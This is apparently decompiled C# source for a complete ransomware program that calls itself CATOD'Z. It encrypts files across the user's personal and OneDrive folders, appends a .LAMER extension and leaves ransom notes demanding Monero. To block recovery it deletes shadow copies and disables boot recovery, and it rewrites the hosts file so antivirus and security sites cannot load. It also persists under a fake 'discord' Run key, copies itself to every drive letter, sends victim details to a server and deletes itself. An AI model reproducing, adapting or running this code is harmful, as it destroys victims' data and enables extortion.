using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using ConsoleApp2;
using ConsoleApp2.Properties;
using Microsoft.Win32;

namespace conso;

internal class Program
{
	private const int SHERB_NOCONFIRMATION = 1;

	private const int SHERB_NOPROGRESSUI = 2;

	private const int SHERB_NOSOUND = 4;

	private const uint SPI_SETDESKWALLPAPER = 20u;

	private const uint SPIF_UPDATEINIFILE = 1u;

	private const uint SPIF_SENDWININICHANGE = 2u;

	public static string encryptedfiles;

	public static string ID;

	public static TextBox text = new TextBox();

	public static string random;

	public static string escritico = "no";

	public int isCritical = 1;

	public int notisCritical = 0;

	public int BreakOnTermination = 29;

	public static string nota_mostrar = "no";

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("ntdll.dll")]
	private static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	private static extern IntPtr NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	[DllImport("shell32.dll")]
	private static extern int SHEmptyRecycleBin(IntPtr hWnd, string pszRootPath, uint dwFlags);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[10] { 3, 4, 2, 6, 5, 8, 7, 1, 5, 4 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public void USB()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string location = Assembly.GetEntryAssembly()!.Location;
		string contents = "@echo off" + Environment.NewLine + "copy \"" + location + "\" A:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" B:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" D:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" E:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" F:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" G:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" H:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" I:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" J:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" K:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" L:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" M:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" N:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" Ñ:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" O:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" P:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" Q:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" R:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" S:\\ABEME.exe" + Environment.NewLine + Environment.NewLine + "copy \"" + location + "\" T:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" U:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" V:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" W:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" X:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" Y:\\ABEME.exe" + Environment.NewLine + "copy \"" + location + "\" Z:\\ABEME.exe" + Environment.NewLine + "exit";
		File.WriteAllText(folderPath + "\\usb_maker.bat", contents);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = folderPath + "\\usb_maker.bat";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
	}

	public void percodigo()
	{
	}

	public void cmd2()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/c @echo off & echo sigueme en github: https://github.com/AnderMoralDiaz!!! & start https://github.com/AnderMoralDiaz";
		Process.Start(processStartInfo);
	}

	public void inicio_void()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string text = "";
		try
		{
			text = File.ReadAllText(folderPath + "\\uac_location");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("discord", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe");
		if (text == "")
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe"))
			{
				File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
			}
		}
		else if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe"))
		{
			File.Copy(text, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
		}
		try
		{
			File.Delete(folderPath + "\\uac_location");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void autodestruir()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string location = Assembly.GetEntryAssembly()!.Location;
		string text = File.ReadAllText(folderPath + "\\uac_location");
		Path.GetFileNameWithoutExtension(location);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/c del \"" + location + "\" /F /Q";
		Process.Start(processStartInfo);
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
		processStartInfo2.FileName = "cmd.exe";
		processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo2.Arguments = "/c del \"" + text + "\" /F /Q";
		Process.Start(processStartInfo2);
	}

	public void EncryptFile(string file, string password)
	{
		try
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
			File.Move(file, file + ".LAMER");
			Console.WriteLine("encrypted: " + file + " >> " + file + ".LAMER");
			encryptedfiles = encryptedfiles + file + Environment.NewLine;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string text = "si";
			string[] source = new string[1] { "//aqui_extensiones" };
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string fileName = Path.GetFileName(files[i]);
				string extension = Path.GetExtension(files[i]);
				if (!(extension == ".LAMER") && !(fileName == "README.txt"))
				{
					if (text == "si")
					{
						EncryptFile(files[i], password);
					}
					else if (source.Contains(extension))
					{
						EncryptFile(files[i], password);
					}
				}
			}
			for (int i = 0; i < directories.Length; i++)
			{
				encryptDirectory(directories[i], password);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void mensaje(string location)
	{
		try
		{
			nota_mostrar = "si";
			string[] contents = new string[1] { "ALL YOUR FILES HAVE BEEN ENCRYPTED BY THE CATOD'Z!\r\nTO DECRYPT FILES, SEND 0.05 XMR TO 48FwefXAV4kKhVvmR83t2AMZXs1NpfWqKJjkjm3Fa58qNQSCAmxBjcNH6ja9R3XckAD47Aytu7TzwSjDotHQ5Z9MBaabThD AND PAYMENT PROOF TO EMAIL !! catodz@proton.me !!".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
				.Replace("%DATE%", DateTime.Now.ToString())
				.Replace("%PRIVATEIP%", GetLocalIPAddress())
				.Replace("%ENCRIPTEDFILES%", encryptedfiles) };
			Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < directories.Length; i++)
			{
				messageCreator(directories[i]);
			}
			File.WriteAllLines(location + "\\README.txt", contents);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void messageCreator(string location)
	{
		try
		{
			nota_mostrar = "si";
			string[] contents = new string[1] { "ALL YOUR FILES HAVE BEEN ENCRYPTED BY THE CATOD'Z!\r\nTO DECRYPT FILES, SEND 0.05 XMR TO 48FwefXAV4kKhVvmR83t2AMZXs1NpfWqKJjkjm3Fa58qNQSCAmxBjcNH6ja9R3XckAD47Aytu7TzwSjDotHQ5Z9MBaabThD AND PAYMENT PROOF TO EMAIL !! catodz@proton.me !!".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
				.Replace("%DATE%", DateTime.Now.ToString())
				.Replace("%PRIVATEIP%", GetLocalIPAddress())
				.Replace("%ENCRIPTEDFILES%", encryptedfiles) };
			Directory.GetDirectories(location);
			File.WriteAllLines(location + "\\README.txt", contents);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static string CreateId(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZMjIxMDA3MTU5OTg30"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZMjIxMDA3MTU5OTg30".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static string GetLocalIPAddress()
	{
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		int num = 0;
		IPAddress iPAddress;
		while (true)
		{
			if (num < addressList.Length)
			{
				iPAddress = addressList[num];
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					break;
				}
				num++;
				continue;
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}
		return iPAddress.ToString();
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void conectar()
	{
		try
		{
			string text = "https://example.com/";
			Console.WriteLine("string enlace creado");
			Console.WriteLine("string informacion creado");
			string address = text + "data.php?info=" + ((Control)Program.text).get_Text();
			Console.WriteLine("strings fusionados");
			WebClient webClient = new WebClient();
			Console.WriteLine("webclient creado");
			webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
			Console.WriteLine("webclient headers");
			Stream stream = webClient.OpenRead(text + "data.txt");
			Console.WriteLine("data");
			StreamReader streamReader = new StreamReader(stream);
			Console.WriteLine("reader");
			string text2 = streamReader.ReadToEnd();
			Console.WriteLine("s");
			stream.Close();
			Console.WriteLine("data close");
			streamReader.Close();
			Console.WriteLine("reader close");
			if (text2.Contains(ID))
			{
				Console.WriteLine("ID ya en el servidor");
				return;
			}
			new WebClient().DownloadString(address);
			Console.WriteLine("enviado");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			conectar();
		}
	}

	public static void fondo()
	{
		try
		{
			File.Copy(CenterScreen.GetBackgroud(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\fondo_antiguo.jpg", overwrite: true);
			random = CreateId(30);
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
			if (File.Exists(folderPath + "\\image.jpg"))
			{
				SystemParametersInfo(20u, 0u, folderPath + "\\image.jpg", 3u);
				File.Delete(folderPath + "\\image.jpg");
			}
			else
			{
				File.WriteAllBytes(folderPath + "\\image" + random + ".jpg", Resources.wallpaper_jpg);
				SystemParametersInfo(20u, 0u, folderPath + "\\image" + random + ".jpg", 3u);
				File.Delete(folderPath + "\\image" + random + ".jpg");
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("ERRORRRRRRRRRRRRRRRR: " + ex.Message);
		}
	}

	public void borrar()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = " /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet";
		Process.Start(processStartInfo);
	}

	public void fond2(string path)
	{
		fondo();
	}

	public void start()
	{
		//IL_0c30: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c37: Expected O, but got Unknown
		try
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\image.jpg"))
			{
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\image.jpg");
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			string location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
			string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
			string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
			string location2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "3D Objects");
			string location3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive");
			string password = Base64Decode("MjIxMDA3MTU5OTg3");
			string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			inicio_void();
			if (File.Exists(folderPath6 + "\\ID"))
			{
				StreamReader streamReader = new StreamReader(folderPath6 + "\\ID");
				ID = streamReader.ReadToEnd();
				streamReader.Close();
			}
			else
			{
				ID = CreateId(40);
				StreamWriter streamWriter = new StreamWriter(folderPath6 + "\\ID");
				streamWriter.Write(ID);
				streamWriter.Close();
			}
			((Control)Program.text).set_Text("ID: " + ID + " enter nombre de usuario: " + Environment.UserName + " enter nombre de PC: " + Environment.MachineName + " enter fecha: " + DateTime.Now.ToString() + "enter ip privada: " + GetLocalIPAddress() + " enter estado: Encriptado enter lines-");
			encryptDirectory(folderPath, password);
			encryptDirectory(location, password);
			encryptDirectory(folderPath2, password);
			encryptDirectory(folderPath3, password);
			encryptDirectory(folderPath4, password);
			encryptDirectory(folderPath5, password);
			encryptDirectory(location2, password);
			encryptDirectory(location3, password);
			password = "";
			File.WriteAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", "127.0.0.1 localhost" + Environment.NewLine + "127.0.0.1 files.avast.com" + Environment.NewLine + "127.0.0.1 www.files.avast.com" + Environment.NewLine + "127.0.0.1 bits.avcdn.net" + Environment.NewLine + "127.0.0.1 www.bits.avcdn.net" + Environment.NewLine + "127.0.0.1 download.eset.com" + Environment.NewLine + "127.0.0.1 www.download.eset.com" + Environment.NewLine + "127.0.0.1 dw89.uptodown.com" + Environment.NewLine + "127.0.0.1 www.dw89.uptodown.com" + Environment.NewLine + "127.0.0.1 pdc1.fra5.pdc.kaspersky.com" + Environment.NewLine + "127.0.0.1 www.pdc1.fra5.pdc.kaspersky.com" + Environment.NewLine + "127.0.0.1 dm.kaspersky - labs.com" + Environment.NewLine + "127.0.0.1 www.dm.kaspersky - labs.com" + Environment.NewLine + "127.0.0.1 install.avira - update.com" + Environment.NewLine + "127.0.0.1 www.install.avira - update.com" + Environment.NewLine + "127.0.0.1 package.avira.com" + Environment.NewLine + "127.0.0.1 www.package.avira.com" + Environment.NewLine + "127.0.0.1 bitdefender.com.tr" + Environment.NewLine + "127.0.0.1 www.bitdefender.com.tr" + Environment.NewLine + "127.0.0.1 www.bitdefender.com" + Environment.NewLine + "127.0.0.1 bitdefender.com" + Environment.NewLine + "127.0.0.1 download.bitdefender.com" + Environment.NewLine + "127.0.0.1 www.download.bitdefender.com" + Environment.NewLine + "127.0.0.1 download.mcafee.com" + Environment.NewLine + "127.0.0.1 www.download.mcafee.com" + Environment.NewLine + "127.0.0.1 buy - download.norton.com" + Environment.NewLine + "127.0.0.1 www.buy - download.norton.com" + Environment.NewLine + "127.0.0.1 free.360totalsecurity.com" + Environment.NewLine + "127.0.0.1 www.free.360totalsecurity.com" + Environment.NewLine + "127.0.0.1 data - cdn.mbamupdates.com" + Environment.NewLine + "127.0.0.1 www.data - cdn.mbamupdates.com" + Environment.NewLine + "127.0.0.1 download.bleepingcomputer.com" + Environment.NewLine + "127.0.0.1 www.download.bleepingcomputer.com" + Environment.NewLine + "127.0.0.1 app.depo - tamindir.com" + Environment.NewLine + "127.0.0.1 www.app.depo - tamindir.com" + Environment.NewLine + "127.0.0.1 www.gsf - sp.softonic.com" + Environment.NewLine + "127.0.0.1 gsf - sp.softonic.com" + Environment.NewLine + "127.0.0.1 cdn.iobit.com" + Environment.NewLine + "127.0.0.1 www.cdn.iobit.com" + Environment.NewLine + "127.0.0.1 download.ccleaner.com" + Environment.NewLine + "127.0.0.1 www.download.ccleaner.com" + Environment.NewLine + "127.0.0.1 update.iobit.com" + Environment.NewLine + "127.0.0.1 www.update.iobit.com" + Environment.NewLine + "127.0.0.1 h2ocdn.lavasoft.com" + Environment.NewLine + "127.0.0.1 www.h2ocdn.lavasoft.com" + Environment.NewLine + "127.0.0.1 devbuilds.s.kaspersky - labs.com" + Environment.NewLine + "127.0.0.1 www.devbuilds.s.kaspersky - labs.com" + Environment.NewLine + "127.0.0.1 virustotal.com" + Environment.NewLine + "127.0.0.1 www.virustotal.com" + Environment.NewLine + "127.0.0.1 www.pandasecurity.com" + Environment.NewLine + "127.0.0.1 pandasecurity.com" + Environment.NewLine + "127.0.0.1 www.f - secure.com" + Environment.NewLine + "127.0.0.1 f - secure.com" + Environment.NewLine + "127.0.0.1 www.trendmicro.com" + Environment.NewLine + "127.0.0.1 trendmicro.com" + Environment.NewLine + "127.0.0.1 download.geo.drweb.com" + Environment.NewLine + "127.0.0.1 www.download.geo.drweb.com" + Environment.NewLine + "127.0.0.1 download.microsoft.com" + Environment.NewLine + "127.0.0.1 www.download.microsoft.com" + Environment.NewLine + "127.0.0.1 dw2.uptodown.com" + Environment.NewLine + "127.0.0.1 www.dw2.uptodown.com" + Environment.NewLine + "127.0.0.1 www.oneindir.com" + Environment.NewLine + "127.0.0.1 oneindir.com" + Environment.NewLine + "127.0.0.1 www.enigmasoftware.com" + Environment.NewLine + "127.0.0.1 enigmasoftware.com" + Environment.NewLine + "127.0.0.1 c.computerbild.de" + Environment.NewLine + "127.0.0.1 www.c.computerbild.de" + Environment.NewLine + "127.0.0.1 dw32.uptodown.com" + Environment.NewLine + "127.0.0.1 www.dw32.uptodown.com" + Environment.NewLine + "127.0.0.1 dl3.vessoft.com" + Environment.NewLine + "127.0.0.1 www.dl3.vessoft.com" + Environment.NewLine + "127.0.0.1 prod.downloadnow.com" + Environment.NewLine + "127.0.0.1 www.prod.downloadnow.com" + Environment.NewLine + "127.0.0.1 download.findmysoft.com" + Environment.NewLine + "127.0.0.1 www.download.findmysoft.com" + Environment.NewLine + "127.0.0.1 dw26.uptodown.com" + Environment.NewLine + "127.0.0.1 www.dw26.uptodown.com" + Environment.NewLine + "127.0.0.1 www.uptodown.com" + Environment.NewLine + "127.0.0.1 uptodown.com" + Environment.NewLine + "127.0.0.1 avast - home.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 www.avast - home.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 malwarebytes - anti - malware.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 www.malwarebytes - anti - malware.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 nod32.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 www.nod32.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 avg - free.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 www.avg - free.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 www.chip.de" + Environment.NewLine + "127.0.0.1 chip.de" + Environment.NewLine + "127.0.0.1 www.computerbild.de" + Environment.NewLine + "127.0.0.1 computerbild.de" + Environment.NewLine + "127.0.0.1 www.heise.de" + Environment.NewLine + "127.0.0.1 heise.de" + Environment.NewLine + "127.0.0.1 www.computerbase.de" + Environment.NewLine + "127.0.0.1 computerbase.de" + Environment.NewLine + "127.0.0.1 youtube.com" + Environment.NewLine + "127.0.0.1 www.youtube.com");
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref notisCritical, 4);
			fond2("a");
			string[] contents = new string[1] { "ALL YOUR FILES HAVE BEEN ENCRYPTED BY THE CATOD'Z!\r\nTO DECRYPT FILES, SEND 0.05 XMR TO 48FwefXAV4kKhVvmR83t2AMZXs1NpfWqKJjkjm3Fa58qNQSCAmxBjcNH6ja9R3XckAD47Aytu7TzwSjDotHQ5Z9MBaabThD AND PAYMENT PROOF TO EMAIL !! catodz@proton.me !!".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
				.Replace("%DATE%", DateTime.Now.ToString())
				.Replace("%PRIVATEIP%", GetLocalIPAddress())
				.Replace("%ENCRIPTEDFILES%", encryptedfiles) };
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref notisCritical, 4);
			mensaje(folderPath);
			mensaje(location);
			mensaje(folderPath2);
			mensaje(folderPath3);
			mensaje(folderPath4);
			mensaje(folderPath5);
			mensaje(location2);
			mensaje(location3);
			messageCreator(folderPath);
			messageCreator(location);
			messageCreator(folderPath2);
			messageCreator(folderPath3);
			messageCreator(folderPath4);
			messageCreator(folderPath5);
			messageCreator(location2);
			messageCreator(location3);
			if (!(nota_mostrar == "no"))
			{
				File.WriteAllLines(folderPath6 + "\\README.txt", contents);
				Process.Start(folderPath6 + "\\README.txt");
			}
			SHEmptyRecycleBin(IntPtr.Zero, Environment.GetFolderPath(Environment.SpecialFolder.Windows).Replace("windows", "").Replace("WINDOWS", "")
				.Replace("Windows", ""), 7u);
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref notisCritical, 4);
			NotifyIcon val = new NotifyIcon();
			val.set_Visible(true);
			val.set_Icon(SystemIcons.get_Asterisk());
			val.set_BalloonTipText("notmen");
			val.set_BalloonTipTitle("titmen");
			string text = "no";
			USB();
			while (text == "no")
			{
				text = ((!NetworkInterface.GetIsNetworkAvailable()) ? "no" : "si");
			}
			percodigo();
			autodestruir();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void Main(string[] args)
	{
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
			string text = "no";
			string text2 = "no";
			string text3 = "no";
			string text4 = "no";
			if (text2 == "no")
			{
				Program program = new Program();
				program.start();
			}
			else
			{
				if (!(text2 == "si"))
				{
					return;
				}
				while (text == "no")
				{
					if (NetworkInterface.GetIsNetworkAvailable())
					{
						text = "si";
						Program program = new Program();
						program.start();
					}
					else if (text3 == "si" && text4 == "no")
					{
						text4 = "si";
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
						registryKey.SetValue("discord", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe");
						string keyName = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
						string valueName = "discord";
						if (Registry.GetValue(keyName, valueName, null) == null)
						{
							MessageBox.Show("//error1", "//error2", (MessageBoxButtons)0, (MessageBoxIcon)16);
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}
}
